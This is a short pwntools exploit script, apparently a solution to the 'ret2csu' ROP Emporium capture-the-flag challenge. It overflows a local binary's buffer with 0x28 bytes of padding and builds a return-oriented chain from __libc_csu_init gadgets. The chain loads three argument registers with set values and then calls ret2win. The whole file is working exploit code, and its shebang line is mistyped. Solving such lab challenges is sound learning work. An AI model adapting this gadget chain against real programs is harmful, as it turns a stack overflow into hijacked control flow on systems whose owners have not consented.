#!usr/bin/unv python3
from pwn import *
context.binary=exe=ELF("./ret2csu",checksec=False)

p=process(exe.path)
input()
###########_fini.######
__libc_csu_fini=0x00000000004006b0 #fini=r12+rbx*8==>r12=0x00000000004006b0 rbx=0x0
#######################


offset=0x28
mov_csu=0x0000000000400680 # mov    rdx,r15 mov    rsi,r14 mov    edi,r13d call   QWORD PTR [r12+rbx*8] pop
pop_rbx_rbp_r12_r13_r14_r15=0x000000000040069a #pop rbx ,pop rbp,pop r12->15
ret=0x00000000004004e6
ret2win=0x400510
pop_rdi=0x00000000004006a3
payload=b"A"*offset+p64(pop_rbx_rbp_r12_r13_r14_r15)
payload+=p64(0x0)+p64(0x1)+p64(0x400e48)+p64(0xdeadbeefdeadbeef)+p64(0xcafebabecafebabe)+p64(0xd00df00dd00df00d)
payload+=p64(mov_csu)
payload+=p64(0)*7
payload+=p64(pop_rdi)+p64(0xdeadbeefdeadbeef)
payload+=p64(ret2win)
p.sendlineafter(b">",payload)

p.interactive()